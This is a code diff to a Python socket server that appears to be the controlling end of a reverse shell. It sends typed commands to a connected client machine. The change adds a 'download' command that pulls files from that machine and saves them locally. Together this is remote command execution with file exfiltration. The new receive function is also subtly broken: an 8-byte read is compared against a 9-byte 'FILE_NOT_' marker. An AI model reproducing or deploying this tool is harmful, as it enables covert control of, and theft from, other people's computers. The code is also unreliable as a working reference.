@@ -80,6 +80,37 @@ def bind_socket():
         log_message(f"Unexpected error during binding: {str(e)}", "ERROR")
         return False
 
+# Receive file from client
+def receive_file(conn, filename):
+    try:
+        response = conn.recv(8)
+        
+        if response == b"FILE_NOT_":
+            extra = conn.recv(5)
+            log_message(f"File not found on client: {filename}", "ERROR")
+            return False
+        
+        file_size = int.from_bytes(response, 'big')
+        log_message(f"Receiving {filename} ({file_size} bytes)...")
+        
+        save_path = f"received_{filename}"
+        bytes_received = 0
+        
+        with open(save_path, 'wb') as f:
+            while bytes_received < file_size:
+                chunk = conn.recv(min(4096, file_size - bytes_received))
+                if not chunk:
+                    break
+                f.write(chunk)
+                bytes_received += len(chunk)
+        
+        log_message(f"File saved: {save_path}")
+        return True
+        
+    except Exception as e:
+        log_message(f"Error receiving file: {str(e)}", "ERROR")
+        return False
+
 # Establish connection with a client
 def socket_accept():
     try:
@@ -117,6 +148,13 @@ def send_command(conn, address):
                 sys.exit()
             
             if len(str.encode(cmd)) > 0:
+                if cmd.startswith("download "):
+                    filename = cmd.split(" ", 1)[1].strip()
+                    conn.send(str.encode(cmd))
+                    receive_file(conn, filename)
+                    print(os.getcwd() + "> ", end="")
+                    continue
+                
                 try:
                     conn.send(str.encode(cmd))
                     log_message(f"Command sent to {address[0]}: {cmd}")
